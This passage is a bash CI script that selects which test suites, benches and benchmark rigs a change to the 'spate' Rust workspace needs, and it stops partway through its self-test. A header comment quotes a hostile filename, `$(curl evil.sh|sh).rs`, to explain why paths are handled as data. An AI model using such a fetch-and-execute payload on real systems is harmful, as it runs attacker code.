#!/usr/bin/env bash
#
# Decide which CI jobs a change actually needs, and write the answers to
# $GITHUB_OUTPUT.
#
# Why this is a script and not `on: paths:` or a filter action:
#
#   * A workflow skipped by `on: paths:` never reports its checks at all, and a
#     required check that never reports blocks the pull request forever. A
#     skipped *job* reports success. So the workflow must always run and the
#     filtering must happen per job — which `on: paths:` cannot express.
#     `on: paths:` also has a silent false negative: past 3,000 changed files it
#     may skip the workflow outright.
#
#   * The container-suite selection below is a reverse-dependency closure over
#     the crate graph. No filter action can express that; it is not a glob.
#
#   * It keeps the pull-request path free of third-party actions. Nothing here
#     runs code we do not own.
#
# Classification is an ignore-list, not an allow-list: anything not recognised
# as documentation counts as code. An allow-list fails *open* — a new source
# directory silently stops being tested, and nothing tells you. This shape fails
# closed, which is the error worth having.
#
# Usage:
#   scripts/ci-changes.sh              # emit outputs (reads env, see below)
#   scripts/ci-changes.sh --self-test  # verify the derived maps against cargo
#                                      # and the source tree
#   scripts/ci-changes.sh --wallclock-rigs <base> <head>   # rigs a diff drives
#   scripts/ci-changes.sh --wallclock-rigs-all             # every runnable rig
#
# Environment:
#   EVENT_NAME  github.event_name
#   BASE_SHA    github.event.pull_request.base.sha  (pull_request only)
#   HEAD_SHA    github.event.pull_request.head.sha  (pull_request only)
#   PR_AUTHOR   github.event.pull_request.user.login  (NOT github.actor, which
#               is whoever last triggered the run and changes on a re-run)
#
# Filenames are attacker-controlled — a branch may legally contain a file called
# `$(curl evil.sh|sh).rs`. Every path here is handled as data: read into a
# variable, matched with bash pattern matching, never eval'd and never
# interpolated into a command line.
#
# What this script cannot defend against: a `pull_request` run executes the pull
# request's *own* copy of it, so a change here narrows the CI of the very change
# proposing it. That is inherent to `pull_request` — the alternative,
# `pull_request_target`, runs the base copy but hands a writable token to a job
# alongside untrusted code, which is a far worse trade. The same property
# applies to scripts/attribution.sh and to the workflow files themselves, and
# the compensating control is the same in all three cases: `.github/` and
# `scripts/` are CODEOWNERS paths, and reviewing what a diff does to CI is part
# of reviewing the diff. `--self-test` checks the container map, not this
# classification path.

set -euo pipefail

# A newline, for the accumulator strings below. Written once because `$'\n'`
# inside a parameter expansion is a parse error in some shells and a literal in
# others, and both failures are quiet.
_NL=$'\n'

# Workspace packages that own `#[ignore]`d container tests. Everything else in
# the workspace has no container suite to run. `--self-test` derives this same
# set from the source tree and fails if the two disagree.
CONTAINER_PKGS="spate spate-kafka spate-clickhouse spate-s3 spate-coordination"

# Reverse-dependency closure: given a changed crate, which container suites can
# its change possibly break? Derived from the path dependencies in each
# crates/*/Cargo.toml — `--self-test` checks this against `cargo metadata`, so
# it cannot drift silently.
#
#   spate-core         is depended on by every crate
#   spate-test         is a dev-dependency of avro, json, kafka, clickhouse, s3, spate
#                    (note: NOT coordination, which uses its own `testing` feature)
#   spate-coordination is depended on by s3 and the facade
#   the connectors   are optional dependencies of the facade only
#
# Note this answers "can it break", not "does it exercise". The facade's own
# container tests drive Kafka and ClickHouse, so a change confined to
# `crates/spate-s3` still boots those via `-p spate` even though no facade test
# touches S3. Keeping the honest closure costs those boots; narrowing it by hand
# would buy them back at the price of a table `cargo metadata` can no longer
# verify. The closure wins — but do not describe this as running "nothing else".
container_suites_for() {
    case "$1" in
        spate-core) echo "$CONTAINER_PKGS" ;;
        spate-test) echo "spate spate-kafka spate-clickhouse spate-s3" ;;
        spate-coordination) echo "spate spate-coordination spate-s3" ;;
        spate-s3) echo "spate spate-s3" ;;
        spate-kafka) echo "spate spate-kafka" ;;
        spate-clickhouse) echo "spate spate-clickhouse" ;;
        # spate-json reaches spate-s3 as a dev-dependency: the object-store
        # framing bench frames with `NdjsonFramer` rather than a local copy,
        # so a change to the framer can break spate-s3's suite.
        spate-json) echo "spate spate-s3" ;;
        spate-avro | spate) echo "spate" ;;
        *) echo "" ;;
    esac
}

# Every crate that has a gungraun bench, discovered rather than listed — the
# `ci: bench` label and the force-all events select all of them, and
# `bench_pkgs_for` below answers from the same set.
#
# Discovery is a subprocess and classification asks about every changed crate,
# so the answer is cached. The cache has to be filled from the parent shell:
# `bench_pkgs_for` is called inside a command substitution, and a subshell can
# read an inherited variable but cannot write one back. `discover_bench_pkgs`
# is therefore called explicitly before any run of per-crate selection — at the
# top of `--self-test` and before the classification loop. Forgetting that call
# costs a subprocess per changed crate; it does not change an answer.
bench_pkgs_discovered=""
bench_pkgs_discovery_done=0
discover_bench_pkgs() {
    if [[ "$bench_pkgs_discovery_done" == "0" ]]; then
        bench_pkgs_discovered=$(
            "$(git rev-parse --show-toplevel)/scripts/gungraun-benches.sh" |
                cut -d' ' -f1 | sort -u
        )
        bench_pkgs_discovery_done=1
    fi
}

all_bench_pkgs() {
    discover_bench_pkgs
    # Nothing rather than a blank line when the set is empty: callers append
    # this to a space-separated list.
    [[ -z "$bench_pkgs_discovered" ]] || printf '%s\n' "$bench_pkgs_discovered"
}

# Does $1 have a gungraun bench? The name is derived from a changed path and is
# therefore attacker-controlled, so it is compared as data: a quoted right-hand
# side in `[[ == ]]` is a literal string, where an unquoted one would be a glob
# and a crate directory named `spate-*` would match every benched crate.
has_gungraun_bench() {
    local pkg
    while IFS= read -r pkg; do
        [[ "$pkg" == "$1" ]] && return 0
    done < <(all_bench_pkgs)
    return 1
}

# Which crates' instruction-count benches should a change to $1 run without
# being asked? Derived from what the benches discover rather than tabulated, so
# a crate that gains a bench is measured by the pull request that adds it and
# nothing here needs editing:
#
#   spate-core             every benched crate. Every crate depends on it, and
#                          codegen is crate-global, so a change there can move a
#                          count in any of them. It selects them whether or not
#                          it owns a bench itself — the rule is about reach.
#   any other benched crate  itself.
#   a crate with no bench   nothing.
bench_pkgs_for() {
    case "$1" in
        spate-core) all_bench_pkgs ;;
        *) if has_gungraun_bench "$1"; then echo "$1"; fi ;;
    esac
}

# ---------------------------------------------------------------------------
# The wall-clock rigs, and which crates select them.
# ---------------------------------------------------------------------------
# A separate question from the counter tier above, with a separate answer. The
# counter tier measures crates and fans out over benches inside them; the
# wall-clock tier runs whole-pipeline rigs, each of which reaches several
# crates. A change to `spate-s3` should drive the object-storage backfill and
# not the ClickHouse encoder.
#
# The mapping is DERIVED, not written down. Each rig is a binary in
# `benchmarks/src/bin/`, and the crates it exercises are the ones it names:
#
#     grep -oE "spate_(core|avro|...)::"
#
# Reading `use` lines alone would undercount — `s3_backfill` reaches
# `spate_json::NdjsonFramer` through a path expression and imports it nowhere —
# and a hand-kept table is one more thing to forget when a rig grows a
# dependency. `--self-test` re-derives it and fails if a rig is in neither list
# below; it does not re-check that an exclusion reason still holds.
#
# Two rigs name no `spate_*` crate at all: `kafka_topology` and `loadgen` drive
# rdkafka directly and measure the broker rather than the framework. Both are
# excluded on the infrastructure ground below, so the mapping never reaches
# them — noted because a reader who promoted one would otherwise expect a crate
# change to select it, and nothing would.
#
# Excluded from the runnable set, with the reason, because an unexplained
# absence reads as an oversight:
#
#   container rigs   need a broker or a database server, so they are run by
#                    hand on identified hardware rather than in CI. Their
#                    numbers are published from `benchmarks/results/` like any
#                    other; what they are not is dispatchable from a diff.
#   s3_backfill_coordinated
#                    dependency-free and otherwise eligible, but it cannot run:
#                    two of its instances claim one gauge series (#89). Listing
#                    it as runnable would turn a dispatch into a red run rather
#                    than a measurement.
WALLCLOCK_RIGS=(deser_formats pipeline_synthetic s3_backfill)
WALLCLOCK_EXCLUDED=(
    ch_native_format ch_sink_saturation e2e_kafka_clickhouse
    kafka_sink_saturation kafka_topology loadgen multi_table_split
    s3_backfill_coordinated
)

# The crates one rig reaches: the ones it names, closed over their workspace
# dependencies.
#
# Naming alone is not enough, and the gap is the same one this mapping exists to
# close, a level deeper. `s3_backfill` names `spate_s3::`; `spate-s3` depends on
# `spate-coordination` and builds a memory store unconditionally, so every run
# of that rig executes coordination code the rig mentions nowhere. Stopping at
# what a rig names would let a coordination change drive no rig at all.
#
# "Names" spans the shared modules a rig pulls in, for the same reason: a crate
# called only from `benchmarks/src/` code is still linked into the rig binary,
# and reading the rig's own source alone would miss it.
#
# The walk is a parser rather than a line-wise grep, because three ordinary
# shapes defeat one. A doc comment mentioning a crate is not a reference to it,
# and reading one as such turns a merge gate red naming a cause that is not
# there. `rustfmt` wraps a long `use benchmarks::{…}` across lines, and a
# line-wise match on the brace form sees no closing brace and drops every module
# in the group. And shared modules reach each other as `crate::x`, never as
# `benchmarks::x`, so the transitive step never fires without it.
#
# The crate list is passed in, built from the directory names under `crates/`
# rather than written out — a hardcoded list is what this file already removed
# once for the container map. Each name is validated first: a directory is a
# name a branch chooses, and one carrying a regex metacharacter would otherwise
# make the match fail and the classifier answer "nothing" with status 0, the
# fail-open this file's header twice says it will not do.
#
# $2 overrides the tree to read, for `--self-test`'s fixtures.
rig_named_crates() {
    local rig=$1 root=${2:-} names name dir
    [ -n "$root" ] || root=$(git rev-parse --show-toplevel)
    names=""
    # Iterated as paths rather than through word splitting: a directory name
    # carrying whitespace would otherwise arrive as two fragments that each
    # pass the check below, while the name it was split from would not.
    for dir in "$root"/crates/*/; do
        name=${dir%/}
        name=${name##*/}
        if [[ ! "$name" =~ ^[A-Za-z0-9_-]+$ ]]; then
            echo "::error::crate directory '$name' carries a character that cannot go into a pattern unescaped." >&2
            return 1
        fi
        names+="${names:+$_NL}$(printf '%s' "$name" | tr '-' '_')"
    done
    if [ ! -f "$root/benchmarks/src/bin/$rig.rs" ]; then
        echo "::error::rig '$rig' has no source at benchmarks/src/bin/$rig.rs." >&2
        return 1
    fi
    printf '%s\n' "$names" | python3 -c '
import os, re, sys

src, rig = sys.argv[1], sys.argv[2]
crates = {n.strip() for n in sys.stdin if n.strip()}

def strip_comments(text):
    # Block first, then line. Neither is string-aware, and it does not need to
    # be: over-stripping can only drop a reference, and a crate path inside a
    # string literal is not a reference to begin with. A line comment opener
    # preceded by a colon is left alone, so a URL in a string does not truncate
    # the code after it.
    text = re.sub(r"/\*.*?\*/", " ", text, flags=re.S)
    return re.sub(r"(?<!:)//[^\n]*", " ", text)

def read(rel):
    for cand in (os.path.join(src, rel + ".rs"), os.path.join(src, rel, "mod.rs")):
        if os.path.isfile(cand):
            with open(cand, encoding="utf-8", errors="replace") as fh:
                return strip_comments(fh.read())
    return None

# One nesting level of braces, spanning newlines because the negated class
# matches them, so a wrapped or nested use-group yields every identifier in it.
# A crate-relative path inside a binary means that binary, not the shared
# library, so the roots differ by where we are: only library files follow it.
def patterns(roots):
    alt = "|".join(roots)
    return (re.compile(r"\b(?:" + alt + r")::([A-Za-z0-9_]+)"),
            re.compile(r"\b(?:" + alt + r")::\{((?:[^{}]|\{[^{}]*\})*)\}"))

IDENT = re.compile(r"[A-Za-z0-9_]+")
BIN = patterns(["benchmarks"])
LIB = patterns(["benchmarks", "crate"])

seen, found, pending = set(), set(), ["bin/" + rig, "lib"]
while pending:
    rel = pending.pop()
    if rel in seen:
        continue
    seen.add(rel)
    text = read(rel)
    if text is None:
        continue
    for crate in crates:
        if re.search(r"\b" + re.escape(crate) + r"::", text):
            found.add(crate)
    plain, group = BIN if rel.startswith("bin/") else LIB
    # A name that turns out to be a function rather than a module simply
    # resolves to no file, so over-collecting here costs nothing.
    pending += plain.findall(text)
    for grp in group.findall(text):
        pending += IDENT.findall(grp)
print("\n".join(sorted(c.replace("_", "-") for c in found)))
' "$root/benchmarks/src" "$rig"
}

# `rig<TAB>crate crate …` for every runnable rig.
#
# Built once by each entry point and passed down as an argument. Not memoised
# inside a helper: every caller is a pipeline, a command substitution or a
# process substitution, so a cache written there lives in a subshell and dies
# with it — the rule this file already records for `discover_bench_pkgs`, and
# one a first attempt here measured at zero hits against 621 misses.
rig_crate_map() {
    local root rig named
    root=$(git rev-parse --show-toplevel)
    # One `cargo metadata`, expanded in python: for each workspace package, the
    # workspace packages it reaches transitively. `--no-deps` keeps registry
    # crates out; a rig reaching `serde` tells us nothing about which rig a
    # change drives.
    local closure
    # cargo's stderr is kept: a stale lockfile under `--locked` fails here, and
    # hiding the cause leaves only "cannot read the workspace dependency graph".
    closure=$(cargo metadata --format-version 1 --no-deps --locked | python3 -c '
import json, sys
m = json.load(sys.stdin)
names = {p["name"] for p in m["packages"]}
# Normal dependencies only. A dev-dependency is linked into a test or a
# bench, never into the rig binary, so a change to the test doubles cannot
# move a rig'"'"'s numbers.
direct = {p["name"]: {d["name"] for d in p["dependencies"]
                      if d["name"] in names and d.get("kind") is None}
          for p in m["packages"]}
def close(n, seen=None):
    seen = seen or set()
    for d in direct.get(n, ()):
        if d not in seen:
            seen.add(d)
            close(d, seen)
    return seen
for n in sorted(names):
    print("{}\t{}".format(n, " ".join(sorted(close(n)))))
') || {
        echo "::error::cannot read the workspace dependency graph" >&2
        return 1
    }
    for rig in "${WALLCLOCK_RIGS[@]}"; do
        named=$(rig_named_crates "$rig") || return 1
        printf '%s\t%s\n' "$rig" "$(
            {
                printf '%s\n' "$named"
                while IFS= read -r c; do
                    [ -n "$c" ] || continue
                    printf '%s' "$closure" | sed -n "s/^$c\t//p" | tr ' ' '\n'
                done <<<"$named"
            } | sed '/^$/d' | sort -u | tr '\n' ' '
        )"
    done
}

# Which runnable rigs does a change to crate $1 drive, given the map in $2?
#
# `spate-core` selects every one of them, for the reason it selects every
# benched crate above: everything depends on it. Any other crate selects the
# rigs that *reach* it — which is the closure, not the naming. A rig that names
# only `spate-s3` is driven by a `spate-coordination` change.
#
# The map is a required argument, not a default that falls back to building
# one. A fallback is invisible: it made the cost linear in the number of
# changed files while the comment above claimed the map was built once, and it
# swallowed the builder's exit status, so a workspace that could not be read
# produced an empty map and therefore the answer "this change drives nothing"
# — the fail-open this file's header twice says it will not do.
wallclock_rigs_for() {
    local crate=$1 map=$2 rig names reached
    # An empty crate name reaches the whole table: the rows end in a space, so
    # the split below yields a trailing empty field that a `-x` match on the
    # empty string would hit.
    [ -n "$crate" ] || return 0
    while IFS=$'\t' read -r rig names; do
        [ -n "$rig" ] || continue
        # `-x` and `-F`, because `$crate` comes from a changed path and a branch
        # chooses those: `crates/spate-.*/README.md` is a legal directory name
        # that as a pattern would match every rig. Captured rather than piped
        # into `grep -q`, for the SIGPIPE reason recorded in `--self-test`.
        reached=$(printf '%s\n' "$names" | tr ' ' '\n' | sed '/^$/d')
        if [ "$crate" = "spate-core" ] || grep -qxF -- "$crate" <<<"$reached"; then
            echo "$rig"
        fi
    done <<<"$map"
}

# Which crate does a changed path attribute to, for the wall-clock mapping?
# Prints the crate name, or nothing when the path drives no rig.
#
# A function rather than a `case` inline in the dispatch below, because
# `--self-test` drives these arms directly. A table that re-implemented them
# kept passing while the real classification drifted, which is the failure
# this seam exists to prevent.
wallclock_crate_for_path() {
    local file=$1 root=$2 crate
    case "$file" in
    # Committed datasets are chart data the site reads, not code — the same
    # call the main classifier makes for them 500 lines below. Listed before
    # the `benchmarks/*` arm because `*` matches `/` in a bash case, so
    # without it a results-recording commit drives every rig.
    benchmarks/results/*) ;;
    crates/*)
        crate="${file#crates/}"
        crate="${crate%%/*}"
        # The changed paths come from a ref pair, but everything they are
        # matched against comes from the checkout: the crate list, the rig
        # sources and the dependency graph. A crate the checkout does not have
        # cannot be mapped, and answering "drives nothing" for it is the
        # fail-open this file's header twice says it will not do — a range
        # spanning a crate rename answered nothing at all, silently, while the
        # main classification path called the same input code.
        #
        # Unresolvable therefore means everything, which is the call that path
        # makes for anything it does not recognise. It costs a full run on the
        # commit that deletes or renames a crate, and that is the direction to
        # be wrong in.
        if [ -d "$root/crates/$crate" ]; then
            printf '%s' "$crate"
        else
            printf '%s' spate-core
        fi
        ;;
    # The rigs themselves, the apparatus that runs and reads them, the workflow
    # that drives them, and what pins the build they all compile into. A change
    # to any can move every number, and none lives under `crates/`. This script
    # is first: without it the change that rewrites how rigs are chosen is the
    # one that never runs them, which the counter tier's equivalent arm records
    # as having already happened once.
    #
    # `Cargo.lock` and the root manifest are here because a dependency or
    # profile change moves what every rig links, and the shared setup action
    # because it pins the toolchain they build with — each alters every
    # measurement without any measured file changing. This is deliberately
    # wider than the counter tier's bench arm, which lists the setup action but
    # not the lockfile: a wall-clock number moves with a dependency bump and an
    # instruction count for a bench that does not call it does not.
    scripts/ci-changes.sh | benchmarks/* | scripts/bench-compare.sh | \
        scripts/bench-drive.sh | \
        Makefile | .github/workflows/scheduled.yml | \
        .github/actions/* | Cargo.lock | Cargo.toml | deny.toml | \
        rust-toolchain.toml | rust-toolchain | .cargo/* | .config/*)
        printf '%s' spate-core
        ;;
    *) ;;
    esac
}

# ---------------------------------------------------------------------------
# The compiled-feature arms, and the matrix built from them.
# ---------------------------------------------------------------------------
# An instruction count describes a build, and a cargo feature that swaps an
# implementation produces a different build of the same bench. The counter tier
# therefore fans out over (package, feature arm) rather than over packages, and
# this is the one place the second dimension is written down.
#
# It lives here rather than in a file of its own because this script already
# answers "which crates does this change measure"; the matrix is that question
# with a second axis. A separate file would be a third thing the apparatus list
# below has to know about and a third thing a pull request can forget to touch.
#
# Each line is `<label> [<cargo feature list>]`:
#
#   label          names the arm in the report, the job name and the artifact
#                  name. `default` is the label for the unmodified build
#                  everywhere — it is not a cargo feature name, because not
#                  every package here declares a `default` key and cargo
#                  rejects `--features default` when one is absent.
#   feature list   what reaches `--features`, verbatim. Absent means the
#                  package's default features and no `--features` flag at all.
#
# The table is written rather than derived, and that is the honest shape: a
# crate's feature keys are not its performance arms. Most of them are optional
# column types or transport knobs no bench executes, and measuring the powerset
# would be exponentially many shards for one real question. An arm earns a
# shard by changing the code under the benches. `--self-test` holds the table
# to `cargo metadata` — an arm naming a feature its package does not declare
# fails the gate rather than burning a shard on `error: the package … does not
# contain this feature`.
feature_arms_for() {
    case "$1" in
        # `simd` replaces the byte-slice-to-value decoder behind the backend
        # seam, so the two arms are one set of benches over two
        # implementations — which is the comparison the seam exists for, and
        # the reason the axis is worth a matrix at all.
        spate-json) printf '%s\n' "default" "simd simd" ;;
        *) printf '%s\n' "default" ;;
    esac
}

# The selected packages crossed with their arms, as a JSON array that
# `fromJSON` hands straight to `strategy.matrix.include`.
#
# Built by string concatenation rather than with jq, borrowing the idiom from
# `gungraun-benches.sh --pkgs-json` — not its source, which derives from
# *unfiltered* discovery and would measure every crate on every pull request.
# Concatenating raw values into JSON is only safe because `--self-test`
# checks both halves of every object against a character class — package names
# against `[A-Za-z0-9_.-]+` and arm labels against `[A-Za-z0-9_.,-]+` — so no
# quote, backslash or control character can reach the document, and nothing
# that GitHub refuses in an artifact name can reach one. The package half
# matters as much as the label: it is a directory name under `crates/`, which
# a branch chooses, not a value this file does.
bench_shards_json() {
    local pkg label feats out="[" first=1
    for pkg in $1; do
        while read -r label feats; do
            [[ -n "$label" ]] || continue
            [[ "$first" -eq 1 ]] || out+=","
            out+="{\"package\":\"$pkg\",\"arm\":\"$label\",\"cargo_features\":\"$feats\"}"
            first=0
        done < <(feature_arms_for "$pkg")
    done
    printf '%s]\n' "$out"
}

# ---------------------------------------------------------------------------
# Self-test: assert the table above still matches the real dependency graph.
# Runs in the `deny` job, which already has a toolchain. `cargo metadata
# --no-deps` reads manifests only and does not resolve the registry.
#
# Both the crate list and the container-package set are derived, never named
# here. An earlier version hard-coded the crate list on both sides of the
# comparison, which meant `cargo metadata` was only ever consulted about crates
# the table already knew about — so adding a whole new connector crate left the
# guard green while its container suite ran nowhere.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Label overrides.
# ---------------------------------------------------------------------------
# `ci: docker`, `ci: loom` and `ci: bench` force a suite on for a pull request
# whose changed paths would not have selected it.
#
# They can only add. `apply_ci_labels` appends to the list it was handed and
# never assigns over it, so its result is a superset of its input by
# construction; `--self-test` asserts that. Keep it that way — the classifier
# fails closed on purpose, and an override able to clear a selection would make
# it fail open.
#
# Removing a label turns nothing off; it stops adding, and the path-derived
# baseline stands.
apply_ci_labels() {
    local labels=",${1:-},"
    local suites="$2"
    if [[ "$labels" == *",ci: docker,"* ]]; then
        suites="$suites $CONTAINER_PKGS"
    fi
    echo "$suites"
}

ci_label_wants_loom() {
    local labels=",${1:-},"
    [[ "$labels" == *",ci: loom,"* ]]
}

# The instruction-count benches. Selected by path below as well; the label is
# for the change whose effect on the hot path the paths cannot see — a
# dependency swap, or a refactor that moves code between crates.
ci_label_wants_bench() {
    local labels=",${1:-},"
    [[ "$labels" == *",ci: bench,"* ]]
}

# Every runnable rig, for a caller that runs them all rather than selecting.
#
#   ci-changes.sh --wallclock-rigs-all
#
# It exists so the weekly smoke job does not keep a second copy of WHICH rigs to
# run. That job still keeps one invocation per rig — a rig needs arguments, and
# those cannot be derived — and it asserts that the two agree in both
# directions, so a rig added here fails it until it is given an invocation, and
# one dropped fails it until the invocation goes too.
if [[ "${1:-}" == "--wallclock-rigs-all" ]]; then
    # Exactly one, for the reason its sibling below rejects a fourth argument:
    # a caller passing more thinks this takes something it does not.
    if [[ $# -ne 1 ]]; then
        echo "usage: $0 --wallclock-rigs-all" >&2
        exit 1
    fi
    printf '%s\n' "${WALLCLOCK_RIGS[@]}"
    exit 0
fi

# Which wall-clock rigs does a diff drive? Answered here rather than by the
# caller, so the dispatched tier and a local run reach the same set from the
# same rules — the same reason both counter legs run `gungraun-benches.sh`.
#
#   ci-changes.sh --wallclock-rigs <base-ref> <head-ref>
#
# Prints one rig per line, or nothing when the change reaches no rig. Nothing is
# an answer: a docs-only change drives no measurement. A diff that cannot be
# computed, or a workspace that cannot be read, is an error instead.
if [[ "${1:-}" == "--wallclock-rigs" ]]; then
    # Exactly three: a fourth argument is a caller that thinks this takes
    # something it does not, and silently ignoring it hides that.
    if [[ $# -ne 3 ]]; then
        echo "usage: $0 --wallclock-rigs <base-ref> <head-ref>" >&2
        exit 1
    fi
    # The merge base, and the same flags the main classification path uses, for
    # the three reasons `docs/user-guide/07-reference/ci.mdx` gives: the base
    # tip drags in everything `main` has gained since the branch moved, rename
    # detection prints only the destination, and `core.quotePath` C-quotes
    # non-ASCII names into matching nothing.
    #
    # Materialised rather than piped into the loop. A process substitution whose
    # producer died iterates zero times and reports success, so an unreachable
    # ref would print nothing and exit 0 — indistinguishable from "this change
    # drives no rig", which is the one answer a caller must not be given by
    # mistake.
    base=$(git merge-base "$2" "$3" 2>/dev/null) || {
        echo "::error::cannot find a merge base for '$2' and '$3'" >&2
        exit 1
    }
    changed=$(mktemp)
    trap 'rm -f "$changed"' EXIT
    if ! git diff --name-only --no-ext-diff --no-textconv --no-renames -z \
        "$base" "$3" >"$changed"; then
        echo "::error::cannot diff '$base'..'$3'" >&2
        exit 1
    fi

    # Built once, here, and passed to every lookup. Failing to read the
    # workspace is an error, not an empty answer.
    map=$(rig_crate_map) || exit 1
    root=$(git rev-parse --show-toplevel)

    selected=""
    while IFS= read -r -d "" file; do
        crate=$(wallclock_crate_for_path "$file" "$root")
        [[ -n "$crate" ]] || continue
        # Captured rather than consumed from a process substitution, for the
        # reason given above the diff: a producer that died would iterate zero
        # times and report success, printing nothing.
        rigs=$(wallclock_rigs_for "$crate" "$map") || exit 1
        while IFS= read -r rig; do
            [[ -n "$rig" ]] || continue
            selected+="$rig"$'\n'
        done <<<"$rigs"
    done <"$changed"
    printf '%s' "$selected" | sort -u
    exit 0
fi

if [[ "${1:-}" == "--self-test" ]]; then
    repo_root=$(git rev-parse --show-toplevel)

    # Every case asserts that what comes out still contains everything that went
    # in. `spate-kafka` stands in for "the paths already selected something", so
    # an override that replaced rather than appended is caught here.
    for labels in "" "ci: docker" "ci: loom" "ci: bench" "ci: docker,ci: loom" \
        "ci: bench,ci: docker" "crate: spate-s3,ci: docker" "area: ci"; do
        for before in "" "spate-kafka" "$CONTAINER_PKGS"; do
            after=$(apply_ci_labels "$labels" "$before")
            for pkg in $before; do
                if [[ " $after " != *" $pkg "* ]]; then
                    echo "::error::apply_ci_labels dropped '$pkg' (labels='$labels', before='$before')."
                    echo "Label overrides must only ever add suites; see the note above the function."
                    exit 1
                fi
            done
        done
    done

    # The docker label also has to do something: the guard above would pass on a
    # function that ignored its input entirely.
    if [[ " $(apply_ci_labels "ci: docker" "") " != *" spate-kafka "* ]]; then
        echo "::error::'ci: docker' no longer forces the container suites on."
        exit 1
    fi
    # Every predicate must recognise exactly its own label, and no other. The
    # labels share a prefix, so a pattern that lost one of its comma anchors
    # would match a neighbour and quietly widen what a label turns on.
    if ! ci_label_wants_loom "ci: loom" ||
        ci_label_wants_loom "ci: docker" ||
        ci_label_wants_loom "ci: bench"; then
        echo "::error::ci_label_wants_loom no longer recognises exactly the loom label."
        exit 1
    fi
    if ! ci_label_wants_bench "ci: bench" ||
        ci_label_wants_bench "ci: docker" ||
        ci_label_wants_bench "ci: loom" ||
        ci_label_wants_bench ""; then
        echo "::error::ci_label_wants_bench no longer recognises exactly the bench label."
        exit 1
    fi

    # Additivity, for an output that is a boolean rather than a set: `bench` is
    # selected by paths OR label, so the only way the label could ever subtract
    # is by ceasing to match once a second label arrives. Both orderings, since
    # a pull request carries its labels in whatever order they were applied.
    for other in "ci: docker" "ci: loom" "crate: spate-s3" "area: ci"; do
        if ! ci_label_wants_bench "ci: bench,$other" ||
            ! ci_label_wants_bench "$other,ci: bench"; then
            echo "::error::'ci: bench' stopped matching alongside '$other'."
            exit 1
        fi
    done

    # Which crates actually own container tests, according to the source tree?
    derived_pkgs=""
    for dir in "$repo_root"/crates/*/; do
        if grep -rqE '#\[ignore' "$dir" --include='*.rs' 2>/dev/null; then
            derived_pkgs="$derived_pkgs $(basename "$dir")"
        fi
    done
    want=$(echo "$CONTAINER_PKGS" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
    got=$(echo "$derived_pkgs" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
    if [[ "$want" != "$got" ]]; then
        echo "::error::CONTAINER_PKGS no longer matches the crates carrying #[ignore]d tests."
        echo "  declared: $want"
        echo "  in tree:  $got"
        echo "Update CONTAINER_PKGS in scripts/ci-changes.sh."
        exit 1
    fi

    metadata=$(cargo metadata --no-deps --format-version 1)

    # The crate list comes from cargo, so a new workspace member is compared
    # like any other and an empty row in the table shows up as a mismatch.
    crates=$(echo "$metadata" | python3 -c \
        'import json,sys; print("\n".join(sorted(p["name"] for p in json.load(sys.stdin)["packages"])))')

    expected=$(
        while IFS= read -r crate; do
            [[ -z "$crate" ]] && continue
            sorted=$(container_suites_for "$crate" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
            printf '%s\t%s\n' "$crate" "${sorted% }"
        done <<<"$crates"
    )

    # The Python below is quoted with single quotes on purpose: it must reach
    # the interpreter verbatim, with no shell expansion of its `$` or backticks.
    # shellcheck disable=SC2016
    actual=$(echo "$metadata" | CONTAINER="$CONTAINER_PKGS" python3 -c '
import json, os, sys

CONTAINER = set(os.environ["CONTAINER"].split())
meta = json.load(sys.stdin)
names = {p["name"] for p in meta["packages"]}

# Forward edges, normal + dev, restricted to workspace-internal packages.
# Self-edges are the `testing`-feature dev-dependencies and carry no
# information about which other crate a change can reach.
deps = {
    p["name"]: {d["name"] for d in p["dependencies"]
                if d["name"] in names and d["name"] != p["name"]}
    for p in meta["packages"]
}

def dependents(target):
    """Every package that transitively depends on target, plus target itself."""
    seen, frontier = {target}, [target]
    while frontier:
        cur = frontier.pop()
        for pkg, ds in deps.items():
            if cur in ds and pkg not in seen:
                seen.add(pkg)
                frontier.append(pkg)
    return seen

for crate in sorted(names):
    suites = " ".join(sorted(dependents(crate) & CONTAINER))
    print("{}\t{}".format(crate, suites))
')
    if [[ "$expected" != "$actual" ]]; then
        echo "::error::container_suites_for() no longer matches the crate graph."
        echo "Update the table in scripts/ci-changes.sh. Table says (<) vs cargo metadata (>):"
        diff <(echo "$expected") <(echo "$actual") || true
        exit 1
    fi
    # Bench selection is derived from discovery, which makes "everything
    # selected has a bench" true by construction and therefore worth nothing as
    # an assertion. What is checked instead is the shape of the three rules —
    # each of them a claim this file, CONTRIBUTING.md and the CI reference all
    # make in prose, and none of them guaranteed by the derivation alone.
    discover_bench_pkgs
    discovered=$(all_bench_pkgs)
    all_pkgs=$(all_bench_pkgs | tr '\n' ' ')
    all_pkgs="${all_pkgs% }"

    # First, because every assertion below is about a discovered set: an empty
    # one would satisfy most of them vacuously while no pull request was
    # measured by path at all.
    if [[ -z "$all_pkgs" ]]; then
        echo "::error::no gungraun bench was discovered; nothing would be measured by path."
        echo "Check scripts/gungraun-benches.sh and the benches/*_gungraun.rs naming convention."
        exit 1
    fi

    # --- the wall-clock rigs ---------------------------------------------
    #
    # Every rig is classified, exactly once. A rig added to `benchmarks/` and
    # left out of both lists would be silently unselectable — the failure this
    # whole seam exists to prevent — so it fails here until somebody says which
    # it is and why.
    declared=$(find "$repo_root/benchmarks/src/bin" -maxdepth 1 -name '*.rs' -type f \
        -exec basename {} .rs ';' | sort)
    classified=$(printf '%s\n' "${WALLCLOCK_RIGS[@]}" "${WALLCLOCK_EXCLUDED[@]}" | sort)
    if [[ "$declared" != "$classified" ]]; then
        echo "::error::every rig under benchmarks/src/bin must appear in exactly one of WALLCLOCK_RIGS or WALLCLOCK_EXCLUDED."
        diff <(printf '%s\n' "$declared") <(printf '%s\n' "$classified") || true
        exit 1
    fi
    # The mapping is derived, so the only thing to check is that it answers.
    # A runnable rig naming no crate could never be selected by any change.
    for rig in "${WALLCLOCK_RIGS[@]}"; do
        if [[ -z "$(rig_named_crates "$rig")" ]]; then
            echo "::error::rig '$rig' names no spate crate, so no change can select it."
            exit 1
        fi
    done

    # The source walk, against a tree built to produce the wrong answers.
    # Three shapes defeat a line-wise grep, and all three occur in this repo:
    # a doc comment naming a crate the rig does not call (deser_formats carries
    # one), a `use benchmarks::{…}` that rustfmt wrapped across lines, and
    # shared modules reaching each other as `crate::x`. Each row below fails
    # without the corresponding part of the parser.
